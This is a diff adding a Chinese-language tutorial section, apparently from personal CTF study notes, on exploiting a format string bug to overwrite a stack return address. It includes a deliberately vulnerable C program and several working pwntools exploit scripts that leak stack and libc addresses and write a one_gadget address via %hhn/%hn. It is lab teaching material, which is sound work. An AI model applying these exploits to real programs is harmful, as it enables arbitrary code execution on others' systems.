@@ -2068,6 +2068,191 @@ o.interactive()
 
 ## format string attack stack
 
+### 介绍
+
+上一篇格式化任意写漏洞更多的是去攻击一些已知的固定的地址, 而栈是不固定的, 所以比上述的要难攻击, 必须要先去泄露栈地址才可以进行
+
+### attack stack
+
+由于栈内的数据偏移量都是固定的, 所以只要泄露出一个栈地址, 就可以推算出其他栈中数据的地址, 如果可以, 直接用格式化任意读就行, 最后就可以覆盖函数返回地址为get shell地址
+
+以一道题来看
+
+```c
+#include<stdio.h>
+#include<string.h>
+#include<unistd.h>
+
+int main() {
+	char buf[0x20];
+	while(1) {
+		read(0, buf, 0x20);
+		if(!strcmp(buf, "Bye\n"))
+			break;
+		printf(buf);
+	}
+	return 0;
+}
+//gcc printf_stack.c -o  printf_stack
+```
+
+这就是个无限格式化字符漏洞利用, 那么第一次可以就用任意读来泄露一个栈地址
+
+![image-20220410224543297](Self-help_Clown.assets/image-20220410224543297.png)
+
+就比如这里这个值就是一个栈地址, 计算偏移量为5个寄存器+5个栈帧=10, %10$p即可leak栈地址
+
+![screenshots](Self-help_Clown.assets/screenshots-16496490403521.gif)
+
+这个地址就是stack地址, 然后我们要计算一下ret函数返回地址和泄露出来的地址的偏移量是多少, 从上面那张图可以看出来, 泄露出来那个栈地址是0xe480, 函数返回地址为0xe3a8, offset = 0xe480 - 0xe3a8 = 216, 所以最终写脚本的时候可以写为
+
+```python
+ret_addr = leak_stack - 216
+```
+
+为了写入方便, 我们这里用格式化字符串漏洞获取shell的话, 最好用one_gadget来完成, 一个地址即可获取shell, 在此之前还需要泄露库函数真实地址, 这里直接任意读读出__libc_start_main, 偏移量为5个寄存器+8个栈帧=13
+
+![screenshots](Self-help_Clown.assets/screenshots-16496494905613.gif)
+
+one_gadget结果为
+
+![screenshots](Self-help_Clown.assets/screenshots-16496497878275.gif)
+
+可以先写一部分脚本了
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+o.interactive()
+```
+
+![image-20220411130941594](Self-help_Clown.assets/image-20220411130941594.png)
+
+可以发现函数返回地址只有最后3个字节和one_gadget不同, 所以任意写的时候, 只要覆写最后三个字节就行
+
+在format string vuln中说过大小控制只有单字节和双字节, 就是没有三字节, 所以要分成两部分来覆盖, 第一部分覆盖最后一个字节, 第二部分覆盖另外两个字节
+
+```python
+part1 = one_gadget & 0xff	# 最后一个字节
+part2 = one_gadget & 0xffffff >> 8	# 另外两个字节
+```
+
+从gdb那张图可以看出buf(也就是填"aaaaaaaa"的地方)偏移量为6, printf是根据\x00截断的, 而p64自动添加\x00, 所以函数返回地址不能填在buf的第一个栈帧, 要往后填, 假设格式化控制符最多占buf两个栈帧, 然后函数返回地址填在buf的第三个栈帧, 也就是%8$n就可以覆盖函数返回地址
+
+```python
+payload = "%{0}p%8$hhn".format(part1)	# 覆盖最后一个字节
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+payload = "%{0}p%8$hn".format(part2)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr+1)	# 覆盖另外两个字节
+o.sendline(payload)
+```
+
+可以先覆盖一个字节来看
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+part1 = one_gadget & 0xff
+ret_addr = stack - 216
+payload = "%{0}p%8$hhn".format(part1)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16496549061797.gif)
+
+可以发现最后一个字节已经被覆盖了, 所以按照同样的方法, 覆盖另外两个字节就行
+
+#### Exploit
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+part1 = one_gadget & 0xff
+part2 = (one_gadget & 0xffffff) >> 8
+print hex(part1)
+print hex(part2)
+ret_addr = stack - 216
+payload = "%{0}p%8$hhn".format(part1)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+payload = "%{0}p%8$hn".format(part2)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr+1)
+o.sendline(payload)
+o.send("Bye\n\x00")		# strcmp是根据\x00进行截断的, 如果不添加的话, 会比对不成功, 因为在输入的Bye\n后面还有其他内容
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16496557280199.gif)
+
+#### Exploit 2
+
+其实可以一次性就覆盖四个字节来覆盖函数返回地址, 但是printf会打印很多字符需要等一段时间, 而且可能会存在卡死的情况
+
+```python
+from pwn import*
+o = process('./stack')
+elf = ELF('./stack')
+libc = elf.libc
+o.sendline("%10$p,%13$p")
+stack = int(o.recv(14), 16)
+o.recvuntil(',')
+libc_start_main = int(o.recv(14), 16) - 231
+libc_base = libc_start_main - libc.sym["__libc_start_main"]
+one_gadget = libc_base + 0x4f2a5
+print "__libc_start_main: %x\none_gadget: %x\nlibc base: %x" % (libc_start_main, one_gadget, libc_base)
+part = one_gadget & 0xffffffff
+ret_addr = stack - 216
+payload = "%{0}p%8$n".format(part)
+payload = payload.ljust(16, "a")
+payload += p64(ret_addr)
+o.sendline(payload)
+o.send("Bye\n\x00")		# strcmp是根据\x00进行截断的, 如果不添加的话, 会比对不成功, 因为在输入的Bye\n后面还有其他内容
+o.interactive()
+```
+
+不推荐用这种方法, 我电脑就跑到直接kill进程了
+
+### 实战
+
+
+
+### 参考
+
 
 
 ## format string attack subfunction
